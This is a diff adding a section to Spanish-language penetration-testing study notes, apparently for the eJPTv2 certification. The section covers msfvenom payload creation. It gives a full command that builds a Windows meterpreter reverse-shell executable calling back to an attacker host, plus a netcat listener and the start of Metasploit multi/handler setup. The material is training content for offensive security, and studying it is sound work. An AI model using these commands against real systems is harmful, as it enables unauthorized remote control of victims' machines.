@@ -119,6 +119,39 @@ A veces puede ser necesario ejecutar el exploit un par de veces para que surta e
 
 ![9](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/9.jpg)   
 
+# Msfvenom – Creazione payloads  
+
+Con esta utilidad puedo crear archivos maliciosos que me permiten obtener una sesión meterpreter en mi máquina atacante.  
+Para crear, por ejemplo, un archivo malicioso para Windows, debo escribir el siguiente comando:  
+
+`sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=6969 -f exe -o file.exe`  
+
+Una vez creado el archivo malicioso y enviado a la máquina objetivo, deberé ponerme en escucha, en este caso en el puerto 6969, para obtener una reverse shell.    
+Puedo hacerlo a través de netcat con el comando `nc -lvnp 6969` o con el multi handler de Metasploit.  
+Veamos cómo usar el multi handler.      
+Ejecuto Metasploit y escribo el comando:  
+
+`use /multi/handler`  
+
+Si escribo `show options`, puedo ver las opciones disponibles:  
+
+![10](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/10.jpg)  
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
 
 
 
